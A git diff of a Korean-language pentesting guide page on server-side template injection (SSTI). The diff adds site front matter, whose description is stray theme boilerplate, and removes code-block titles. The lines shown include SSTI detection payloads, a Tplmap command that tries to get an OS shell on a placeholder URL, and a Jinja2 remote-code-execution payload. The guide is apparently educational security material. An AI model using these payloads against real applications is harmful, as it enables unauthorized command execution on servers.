@@ -1,4 +1,11 @@
-
+---
+layout: page
+title: SSTI
+description: >
+  This chapter covers the basics of content creation with Hydejack.
+hide_description: true
+sitemap: false
+---
 
 # SSTI (서버 사이드 템플릿 인젝션) 가이드
 
@@ -13,7 +20,7 @@ https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injecti
 - **목표:** 웹 애플리케이션이 사용자 입력을 템플릿의 일부로 처리하는지 확인합니다.
 - **전략:** 다양한 템플릿 엔진에서 사용하는 문법으로 간단한 수학 연산(예: `7*7`)을 포함한 페이로드를 삽입하고, 서버가 이 연산을 수행하여 `49`를 반환하는지 확인합니다.
 
-```text(title="SSTI 식별용 기본 페이로드")
+```text
 ${7*7}
 {{7*7}}
 <%= 7*7 %>
@@ -52,7 +59,7 @@ ${7*7}
 
 - **[Tplmap GitHub 링크](https://github.com/epinna/tplmap)**
 
-```bash(title="Tplmap을 이용한 RCE")
+```bash
 # -u: 취약한 URL (퍼징할 위치에 * 표시)
 # --os-shell: OS 셸 획득 시도
 python3 tplmap.py -u "http://vulnerable.com/page?name=*" --os-shell
@@ -61,7 +68,7 @@ python3 tplmap.py -u "http://vulnerable.com/page?name=*" --os-shell
 #### **수동 익스플로잇 (예: Python/Jinja2)**
 엔진이 식별되면, [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) 같은 저장소에서 해당 엔진에 맞는 RCE 페이로드를 찾아 사용할 수 있습니다.
 
-```python(title="Jinja2 RCE 페이로드 예시")
+```python
 # OS 모듈을 임포트하여 명령어 실행
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
 ```
